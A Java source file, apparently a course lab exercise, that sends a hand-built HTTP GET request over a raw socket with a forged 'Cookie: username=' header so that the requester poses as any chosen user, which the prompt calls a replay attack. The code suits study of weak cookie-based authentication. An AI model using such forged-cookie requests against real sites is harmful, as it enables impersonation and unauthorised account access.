import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.Socket;
import java.net.URI;
import java.util.Scanner;

import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

public class Handshake {

	private static final int PORT = 80;
	private URI uri;
	private final StringBuilder header;
	private final StringBuilder html;
	public static String hostname;
	private static final Logger logger = LogManager.getLogger();

	public Handshake(URI uri) {
		this.uri = uri;
		this.html = new StringBuilder();
		this.header = new StringBuilder();
	}
	
	public Handshake() {
		this.html = new StringBuilder();
		this.header = new StringBuilder();
	}
	
	public URI getURI() {
		return this.uri;
	}
	
	public String getHTML() {
		return html.toString();
	}
	
	public String getHEADER() {
		return header.toString();
	}
	
	public static void main(String argv[]) throws Exception {
		Scanner scan = new Scanner(System.in);

		System.out.println("Enter the website: (Must have form: <protocol>://<domain>/<resource/path file>)");
		System.out.println("If you can't think of one use: https://cs.usfca.edu/~skwong5/cs480/welcome.php");
		
		hostname = scan.next();
		
		URI link = new URI(hostname);
				
		Handshake hs = new Handshake(link);
		
		hs.fetch();
		
		System.out.println(hs.getHEADER());
		
		System.out.println(hs.getHTML());
	}

	private String craftRequest() {

		String host = this.getURI().getHost();
		String resource = this.getURI().getPath().isEmpty() ? "/" : this.getURI().getPath();
		
		Scanner scan = new Scanner(System.in);
		
		System.out.println("Enter a user you want to use a replay attack on: ");
		
		String username = scan.next();

		System.out.println("Host: " + host);
		System.out.println("Resource: " + resource);
		
		StringBuffer output = new StringBuffer();
		output.append("GET " + resource + " HTTP/1.0\n");
		output.append("Host: " + host + "\n");
		output.append("Cookie: username=" + username + "\n");
		output.append("\r\n");

		return output.toString();
	}

	public void fetch() {

		String host = this.getURI().getHost();
		
		try(Socket socket = new Socket(host, PORT);
			BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
			DataOutputStream writer = new DataOutputStream(socket.getOutputStream());
			) {

			writer.writeBytes(craftRequest());
			writer.flush();
			
			String line = reader.readLine();

			while(line != null) {				
				if(line.isEmpty()) {
					break;
				}
				else {
					header.append(line + " ");
					line = reader.readLine();
				}
			}
			while (line != null) {
				html.append(line + " ");
				line = reader.readLine();
			}
		}
		catch (Exception e) {
			logger.catching(Level.DEBUG, e);
			System.out.println("Something obviously went wrong.");
		}
	}
}